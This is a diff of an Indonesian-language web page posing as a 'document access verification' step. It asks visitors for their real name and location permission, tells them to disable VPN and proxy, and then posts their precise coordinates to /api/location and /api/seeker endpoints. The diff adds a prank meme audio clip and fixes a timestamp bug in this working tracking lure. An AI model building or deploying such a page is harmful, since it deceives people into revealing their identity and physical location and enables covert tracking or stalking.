@@ -18,7 +18,8 @@
       background: #000;
       color: white;
       border-radius: 8px;
-      border: none; 
+      border: none;
+      cursor: pointer;
     }
   </style>
 </head>
@@ -26,8 +27,10 @@
   <h2>Verifikasi Akses Dokumen</h2>
   <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
   <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
-  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg"> <br>
-  <audio id="audio" src="/audio1.mp3"></audio>
+  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>
+
+  <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/y2mate.com%20-%20Boy%20what%20the%20hell%20boy%20talking%20Tom%20meme.mp3" preload="auto"></audio>
+
   <input type="text" id="nama" placeholder="Nama Asli"><br><br>
   <button onclick="submitData()">Dapatkan Link</button>
 
@@ -37,8 +40,13 @@
     function submitData() {
       const nama = document.getElementById("nama").value.trim();
       if (!nama) return alert("Nama wajib diisi.");
-
       if (!id) return alert("ID dokumen tidak ditemukan.");
+
+      // Coba putar audio
+      const audio = document.getElementById("audio");
+      audio.play().catch((e) => {
+        console.warn("Autoplay diblokir:", e);
+      });
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -48,17 +56,17 @@
               lat: pos.coords.latitude,
               lon: pos.coords.longitude,
               acc: pos.coords.accuracy,
-              timestamp: new Date().toISOString
+              timestamp: new Date().toISOString()
             };
 
-            // kirim ke /api/location
+            // Kirim ke /api/location
             fetch("/api/location", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(body),
             }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
 
-            // kirim ke /api/seeker/[id]
+            // Kirim ke /api/seeker/[id]
             fetch(`/api/seeker/${id}`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -79,7 +87,6 @@
       } else {
         alert("Browser tidak mendukung geolokasi.");
       }
-      <button onclick="document.getElementById('audio').play()">Putar Audio</button>
     }
   </script>
 </body>
